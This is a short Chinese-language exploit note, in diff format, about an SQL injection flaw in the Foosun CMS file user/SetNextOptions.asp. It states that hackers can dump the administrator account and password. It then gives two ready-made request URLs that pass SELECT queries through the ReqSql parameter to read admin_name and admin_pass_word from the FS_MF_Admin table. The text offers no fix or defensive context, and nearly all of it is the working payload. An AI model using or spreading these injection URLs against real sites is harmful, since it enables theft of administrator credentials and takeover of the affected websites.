@@ -1,0 +1,9 @@
+讯foosun的注册文件存在漏洞。黑客们可以暴管理员帐号和密码。
+漏洞文件：www.xxx.com/user/SetNextOptions.asp
+利用简单的方法：
+
+
+暴管理员帐号：
+www.xxx.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_name,3,4,5,6,7,8++from+FS_MF_Admin
+暴管理员密码：
+www.xxx.com/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_pass_word,3,4,5,6,7,8++from+FS_MF_Admin
